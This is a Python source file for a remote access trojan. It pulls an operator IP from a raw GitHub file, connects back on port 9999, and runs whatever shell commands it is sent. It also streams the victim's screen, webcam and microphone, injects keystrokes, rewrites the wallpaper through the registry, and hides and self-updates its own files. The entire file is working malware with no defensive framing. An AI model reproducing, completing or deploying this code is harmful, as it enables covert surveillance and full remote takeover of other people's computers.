listFileDepency = ['scripter.py', 'sound.py']
hideFile = ["__pycache__"]
githubUrl = "https://raw.githubusercontent.com/N0SAFE/kit-local/main/rootKit/"
import socket
def connected():
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect(("www.google.com", 80))
        sock.close()
        return True
    except:
        sock.close()
        return False

import subprocess, os, requests, time, threading, select
try:
    import easyimporting
except:
    subprocess.Popen("py -m pip install easyimporting", shell=True)

try:
    import file
except:
    if connected():
        with open("file.py", 'w'):
                pass
        with open("file.py", "a") as file:
            for line in requests.get(f"{githubUrl}file.py").text.split('\n'):
                file.write(line)
        from file import File
    else:
        exit()


f = File(os.getcwd().replace('\\', '/')+"/")
for file in hideFile:
    f.hide(file)
for file in listFileDepency:
    f.modify(file, githubUrl+file)

def getpath(change=False):                          return os.getcwd() if change in (False, "not", "\\") else os.getcwd().replace('\\', '/')
def getSelfFileName():                              return os.path.basename(__file__)

from sound import Sound
import scripter
s = Sound()

easyimporting.importing("vidstream pyautogui lib_platform pyaudio")
from vidstream import ScreenShareClient, CameraClient
import pyautogui, socket, lib_platform, pyaudio

FORMAT = pyaudio.paInt16
CHANNELS = 1
RATE = 44100
CHUNK = 4096
audio = pyaudio.PyAudio()


def camera(port):
    client = CameraClient(ipScreen, port)
    client.start_stream()
def screen(port):
    sender = ScreenShareClient(ipScreen, port)
    sender.start_stream()
def microphone(port, ip):
    serversocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    serversocket.bind((ip, port))
    serversocket.listen(1)
    print('socket listen')
    print(port, ip)
    def callback(in_data, frame_count, time_info, status):
        for s in read_list[1:]:
            s.send(in_data)
        return (None, pyaudio.paContinue)
    try:
        stream = audio.open(format=FORMAT, channels=CHANNELS, rate=RATE, input=True, frames_per_buffer=CHUNK, stream_callback=callback)
        read_list = [serversocket]
        try:
            while True:
                readable, writable, errored = select.select(read_list, [], [])
                for s in readable:
                    if s is serversocket:
                        (clientsocket, address) = serversocket.accept()
                        read_list.append(clientsocket)
                        print("socket accept")
                    else:
                        data = s.recv(1024)
                        if not data:
                            read_list.remove(s)
        except Exception as e:
            print(e)
            pass
        print('mic stop')
        serversocket.close()
        stream.stop_stream()
        stream.close()
    except:
        print('no mic')
        (clientsocket, address) = serversocket.accept()
        clientsocket.send('error'.encode())
        serversocket.close()
    

# esential function
def terminal(command):
    subprocess.Popen(command, shell=True)

def wallpaper(data):
    importImg(data)
    severalcmd('reg add "HKEY_CURRENT_USER\\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d '+getpath()+'\\Image.jpg'+' /f 98!89RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True 98!89reg add "HKEY_CURRENT_USER\\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d '+getpath()+'\\Imge.jpg'+' /f 98!89RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True98!89reg add "HKEY_CURRENT_USER\\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d '+getpath()+'\\Image.jpg'+' /f 98!89RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True ')
    
def severalcmd(data, temp=0.05):
    datalist = data.split("98!89")
    for i in datalist:
        print(i)
        terminal(i)
        time.sleep(temp)

def stopall():
    subprocess.Popen(getSelfFileName(), shell=True)

        
def importImg(data):
    import urllib.request
    print(data)
    urllib.request.urlretrieve(data, "Image.jpg")

def cdAccess(cd):
    os.chdir(cd)
    
def write(text):
    pyautogui.write(text)
    
def press(key):
    if key == "winleft":
        pyautogui.press("winleft")
    elif key == "enter":
        pyautogui.press("enter")
    elif key == "tab":
        pyautogui.press("tab")
    elif key[0:10] == "backspace(":
        number = int(key[10:len(key) - 1])
        for i in range(number):
            pyautogui.press("backspace")

def receive(timeoutKill):
    global run, progrun
    while True:
        s.settimeout(timeoutKill)
        try:
            receive = (s.recv(2048).decode())
            print(receive)
        except:
            receive = "left"
            print('break')
        if receive == 'left':
            time.sleep(2)
            print(receive)
            run = False
        if receive == "die":
            print(receive)
            progrun = False
            run = False
        if receive != "9":
            return receive

def execute(data):
    global run, sortir, ossys, reloading
    data = data.replace("9", "")
    data = data.replace("1+8", "9")
    datalist = data.split()
    if not datalist:
        return None
    if data == "die":
        return None
    elif data[0:2] == "cd":
        cdAccess(data[3:len(data)])
    elif data[0:6] == "write(":
        write(data[6:len(data) - 1])
    elif data[0:6] == "press(":
        press(data[6:len(data) - 1])
    elif datalist[0] == "screen":
        t = threading.Thread(target=screen, args=(int(datalist[1]),))
        t.daemon = True
        t.start()
    elif datalist[0] == "camera":
        t = threading.Thread(target=camera, args=(int(datalist[1]),))
        t.daemon = True
        t.start()
    elif datalist[0] == "microphone":
        t = threading.Thread(target=microphone, args=(int(datalist[1]), datalist[2],))
        t.daemon = True
        t.start()
    elif data == "left":
        print("restart")
        return None
    elif data[0:4] == "fast":
        scripter.speed_write(data[5:len(data)])
    elif data == "test":
        print("test")
    elif datalist[0] == "severalcmd":
        datalist.pop(0)
        data = " ".join(datalist)
        severalcmd(data)
    elif datalist[0] == "wallpaper":
        datalist.pop(0)
        data = " ".join(datalist)
        wallpaper(data)
    else:
        terminal(data)


run, progrun = True, True
timeoutKill = 2000

while True:
    ipScreen = f.getByGithub(f"{githubUrl}ip").replace("\n", "")
    print(ipScreen)
    print("ready")
    BREAK = False
    run = True
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ipScreen, 9999))
        s.send(str(lib_platform.hostname).encode())
    except:
        run = False
        pass
    if run:
        while True:
            execute(receive(timeoutKill))
            if run == False:
                break
        if not progrun:
            break
        s.close()
